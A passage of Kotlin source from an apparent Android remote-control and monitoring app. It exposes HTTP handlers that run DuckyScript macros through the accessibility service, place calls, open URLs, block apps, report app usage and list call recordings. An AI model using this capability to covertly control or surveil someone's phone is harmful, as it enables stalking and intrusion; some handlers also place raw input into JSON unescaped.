        val req = DuckyExecuteRequest.fromJson(bodyString)
        if (req.scriptContent.isBlank()) {
            return "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Script content is empty\"}"
        }

        return try {
            if (AppAccessibilityService.instance == null) {
                return "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Accessibility service disabled\"}"
            }

            DuckyScriptEngine.executePayloadAsync(
                context,
                req.scriptContent,
                "01-master-commands"
            ) { _ -> }

            val respJson = JSONObject().apply {
                put("status", "executing")
                put("message", "DuckyScript macro execution launched successfully")
            }.toString()

            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$respJson"
        } catch (e: Exception) {
            val err = e.message ?: "Execution error"
            "HTTP/1.1 500 Internal Server Error\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"$err\"}"
        }
    }

    private fun handleControlToast(context: Context, bodyString: String): String {
        return try {
            val json = JSONObject(bodyString)
            val msg = json.optString("message", "")
            if (msg.isNotBlank()) {
                MonitorService.activeInstance?.handleToastPublic(msg) ?: android.os.Handler(android.os.Looper.getMainLooper()).post {
                    Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
                }
            }
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"status\":\"ok\",\"message\":\"Toast displayed: $msg\"}"
        } catch (e: Exception) {
            "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"${e.message}\"}"
        }
    }

    private fun handleControlVibrate(context: Context, bodyString: String): String {
        return try {
            val json = JSONObject(bodyString)
            val durationMs = json.optInt("durationMs", 500)
            MonitorService.activeInstance?.handleVibratePublic(durationMs.toLong()) ?: run {
                val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as? android.os.Vibrator
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vibrator?.vibrate(android.os.VibrationEffect.createOneShot(durationMs.toLong(), android.os.VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vibrator?.vibrate(durationMs.toLong())
                }
            }
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"status\":\"ok\",\"durationMs\":$durationMs}"
        } catch (e: Exception) {
            "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"${e.message}\"}"
        }
    }

    private fun handleControlCall(context: Context, bodyString: String): String {
        return try {
            val json = JSONObject(bodyString)
            val phoneNumber = json.optString("phoneNumber", "")
            MonitorService.activeInstance?.handleCall("", phoneNumber)
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"status\":\"ok\",\"phoneNumber\":\"$phoneNumber\"}"
        } catch (e: Exception) {
            "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"${e.message}\"}"
        }
    }

    private fun handleControlOpenUrl(context: Context, bodyString: String): String {
        return try {
            val json = JSONObject(bodyString)
            val url = json.optString("url", "")
            MonitorService.activeInstance?.handleOpenUrl("", url)
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"status\":\"ok\",\"url\":\"$url\"}"
        } catch (e: Exception) {
            "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"${e.message}\"}"
        }
    }

    private fun handleOemAutostartStatus(context: Context): String {
        val json = JSONObject().apply {
            put("manufacturer", OemAutostartManager.getManufacturer())
            put("isAutostartAvailable", OemAutostartManager.isAutostartAvailable(context))
            put("isBatteryOptimizationIgnored", OemAutostartManager.isBatteryOptimizationIgnored(context))
        }
        return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
    }

    private fun handleAppUsage(context: Context): String {
        val jsonStr = AppUsageBlockerManager.getAppUsageJson(context)
        return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$jsonStr"
    }

    private fun handleSetAppBlockRules(context: Context, bodyString: String): String {
        return try {
            val json = JSONObject(bodyString)
            val packagesArr = json.optJSONArray("blockedPackages")
            val set = mutableSetOf<String>()
            if (packagesArr != null) {
                for (i in 0 until packagesArr.length()) {
                    set.add(packagesArr.getString(i))
                }
            }
            AppUsageBlockerManager.setBlockedPackages(context, set)
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"status\":\"ok\",\"blockedCount\":${set.size}}"
        } catch (e: Exception) {
            "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"${e.message}\"}"
        }
    }

    private fun handleCallRecordingsList(context: Context): String {
        val files = CallRecordingEngine.getRecordedFiles(context)
        val arr = JSONArray()
        for (f in files) {
            val obj = JSONObject().apply {
                put("name", f.name)
                put("sizeBytes", f.length())
                put("lastModified", f.lastModified())
            }
            arr.put(obj)
        }
        return "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$arr"
    }
}
